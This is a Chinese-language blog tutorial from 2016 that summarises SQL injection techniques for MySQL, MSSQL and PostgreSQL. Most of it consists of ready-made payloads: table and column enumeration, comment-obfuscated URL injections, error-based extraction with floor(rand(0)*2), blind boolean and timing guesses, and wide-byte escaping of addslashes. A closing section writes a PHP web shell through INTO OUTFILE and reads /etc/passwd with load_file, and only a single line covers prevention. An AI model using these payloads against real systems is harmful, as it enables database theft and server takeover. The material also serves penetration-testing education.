---
title: SQL注入总结（一）
date: 2016-01-19 23:26:39
categories:
- Web安全
tag:
- SQL注入
---
<h2 id="intro">前言</h2>习惯sqlmap方便的的同时，会不知不觉依赖上，差点忘了根本，遂总结了一下，提醒自己

### 常见的SQL注入形式
- **读取数据库内容常用方式:**　information_schema，mysql.user
- **有回显的函数错误提示:** 有SQL错误显示；
- **无回显的函数错误提示:** 盲注，即没有有SQL错误显示；
- **加密形式:** SQL加密执行显示;
- **其他形式:** 宽字节注入等;
- **预防措施:** 如何避免；
- **常用函数:** sql自带的函数；
- **其他:** 补充的地方；

<!-- more -->
## 读取数据库内容常用方式
　　数据库都会有内置的表，里面已经包含了所有建表的信息。以MySQL为例。在５版本以上的数据库使用如下语句，就可以直接获得数据库的表的信息。
### MySQL
　　比如在MySQL下有
``` bash
    select group_concat(distinct table_name) from information_schema.columns where table_schema=database()
```
　　不理解的话，可以直接查阅MySQL的information_schema.columns表就会清楚。相关的字段有 table_name，table_schema，column_name。
　　mysql.user表相应的字段就会有User,Password.
　　通过这些方式我们大概就可以知道目标数据库，所应有的表信息，就可以进行相应的操作。注释的话比如--,#,/*等
### MSSQL
　　在MSSQL下
　　在开始前我们先来认识下默认系统表—sysdatabases。sysdatabases是MSSQL默认系统表，包含“master”，“msdb”，“mssqlweb”，“empdb”，“model”这五个表，对应的bdid的值为1到5，用户新建的数据库从bdid=6开始，我们可以通过修改bdid的值来得出库名，语句为：
``` bash
    select name from master.dbo.sysdatabases where dbid=1
    union select name from yourdatabasename.dbo.sysobjects where xtype=char(85) and name not in (select top XX name from yourdatabasename.dbo.sysobjects where xtype=char(85))--
```
　　上面的XX为数字，即表的序号，为数字。通过这种方式获得表名，接下来就是字段名。
　　然后分开两个步骤：
　　１.获得表段的总序号（与id不同）
``` bash
    union select id from yourdatabasename.dbo.sysobjects where xtype=char(85) and name not in (select top XX name from yourdatabasename.dbo.sysobjects where xtype=char(85))--
```
　　２.根据表的序号一个个列出字段的名字
``` bash
    union select name from yourdatabasename.dbo.syscolumns where ID=2073058421 and name not in (select top XX name from yourdatabasename.dbo.syscolumns where ID=2073058421 )--
```
　　这里的ID是通过上面的步骤得出来的。
　　其他技巧在针对字符输入的时候，由于不能使用引号可以采用如下方式:
``` bash
http://******?ID=1/**/And/**/(/**/select/**/top/**/1/**/name/**/from/**/
(/**/select/**/row_number()/**/over(/**/order/**/by/**/object_id)/**/as/**/rownumber,
*/**/from/**/Web.sys.all_objects/**/
where/**/type=char(85))A/**/where/**/rownumber=1)>0 
```
　　通过修改rownumber可以获得表名，图上的数据库名为Web，如果是其他表的那就不会一样了
　　同样用类似的方法可以获得字段
``` bash
http://××××?ID=1/**/
And/**/(/**/select/**/top/**/1/**/COLUMN_NAME/**/
from(/**/select/**/row_number()/**/over(/**/order/**/by/**/ORDINAL_POSITION)/**/as/**/rownumber,
*/**/from/**/Web.information_schema.columns/**/
where/**/TABLE_NAME=NCHAR(31649)%2bNCHAR(29702)%2bnchar(24080)%2bnchar(25143))/**/A/**
/where/**/rownumber=2)>0 
```
　　%2b为＋号，由于表名是中文，就会出现上面的样子，不是中文就不会这样。
### PostgreSQL
　　在PostgreSQL下
　　PostgreSQL常用的自带函数有:
``` bash
    union select datname from pg_database
    order by 11                                         #猜字段
    and (select length(current_database())) between 0,30 　　　　　　#判断数据库长度
    and(select ascii(substr(current_database(),1,1))) between 0,64　　#判断数据库名的第１位是否是在０,64的ascii码之间。
    select relname from pg_stat_user_tables limit 1 offset n;
    and(select count(*) from pg_stat_user_tables) between 0,64　　#判断数据库表数
    and(select length(relname) from pg_stat_user_tables limit 1 offset 0) between 0,64　　#判断数据库表第一个表的长度
    and(select ascii(substr(relname,1,1)) from pg_stat_user_tables limit 1 offset 0) between 0,64　　#判断数据库第一张表的第一个字符

```
　　相应的操作其实和MySQL的操作类似，也可以直接使用MySQL的方式得出相应的数据
## 有回显的函数错误提示
　　针对有函数回显，方式就会方便很多。可以通过union select 先得到应有的字段有多少个，如果不是数字型记得把数字换成null。union和union all的区别是,union会自动压缩多个结果集合中的重复结果，而union all则将所有的结果全部显示出来，不管是不是重复。此外猜字段的方式还可以用having '1'='1'的方式来，通过错误提示，间接的得到表的属性字段。其他方式的话，自由发挥。
　　有时候的回显，并不是直接建立在可视化的模块的界面，而是只有SQL内置报错函数的时候，就需要使用另一种方式，比如：
```bash
    and 1=2 union select 1 from (select count(*),concat(floor(rand(0)*2),(the code you put))a from information_schema.tables group by a)b  
```
　　这句话的思路是通过floor(rand(0)*2)可能出现1或０的状况在group的时候，会出错，就会直接显示出错的地方，从而显示相应的字段或者数据，使用时，常常会用到limit,当然这种方法也有局限性，比如不能使用update,select into,insert,load_file(),group_concat()等函数，所以使用的时候，就会有相应的限制。得出的错误，会在开头多出一个１，所以去掉就可以了。
## 无回显的函数错误提示
　　在没有回显的状态下如何判断存在注入，最直观的情况下，可以用benchmark等类似的延迟函数，看有没有延迟返回，来判断有没有执行SQL语句。
　　针对返回只有true和false的这种情况，可以通过构造一个判断，来猜表的相应的内容。
　　比如：
```bash
    and left(databse(),1)='1'　　　　　　　　　　　　 #猜数据库名的第一位是１
    and length(databse())='1'　　　　　　　　　　　   #猜数据库名长度为１
    and substr(left(role,1),1,1)=char(49) %23　　 　　　#该表的role字段第一位为１,char(49)=1
```
　　通过类似这些方式进行猜解。当然为了避免php的GPC函数，需要用到hex函数以及使用ascii码来绕过，比如上图中的３的示例。
## 加密形式
　　有些程序员会通过将查询的部分加密，然后传到服务器解密，然后进行查询。常见的方式有base64,以及其他的方式。这时候策略就会和之前一样，只不过，在构造的时候，多一部分编码就可以了。
## 其他形式
### 宽字节注入
　　比如%df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\，变成了 %df\’，其中\的十六进制是 %5C ，那么现在 %df\’ =%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MYSQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗’，也就是说：%df\’ = %df%5c%27=縗’，有了单引号就好注入了。其实不仅仅是%df可以，其他附近还有一定领域的也可以，可以字节去查一下。
## 常用函数
　　MySQL常用的自带函数有:
``` bash
    user()                               //显示数据库用户
    database()                      //当前数据库名
    version()                        //数据库版本
    concat()                          //联合数据
    group_concat()             //多组数据拼接
    hex()                                 //十六进制编码
    unhex()                             //十六进制解码
    load_file()                     //读取文件
    @@datadir                    //数据路径
    @@tmpdir                       //临时路径
    @@version                     //数据库版本

```

　　其他的诸如 @@version_comment，@@version_compile_os，@@warning_count等可以自己去翻一下。
　　此外用到比如转换类型比如convert( using latin1),以及select file into outfile'/asd/a.a'可以自己去尝试。
　　MSSQL常用的自带函数有:
``` bash
    db_name()                               //显示数据库名
```
　　PostgreSQL常用的自带函数有:
``` bash
    version()                               //显示数据库版本信息

```
## shell编写
``` bash
    create table test (a text);
    insert into test(a) values('code that you print');
    select a from text into outfile 'C://asd//a.php'
    #读取文件操作
    create table test (a text);
    insert into test(a) values(load_file('/etc/passwd'));
    select a from test 

```
## 预防措施
　　如果只有int的参数，最好最后直接转换为int类型，这样就可以避免注入，此外针对一些特殊的函数符号进行过滤。其他的一部分，下次会继续讲解，包括绕过等一些方式。
当然因为篇幅的原因，很多东西没有延伸开来，如果有错误的话欢迎指正。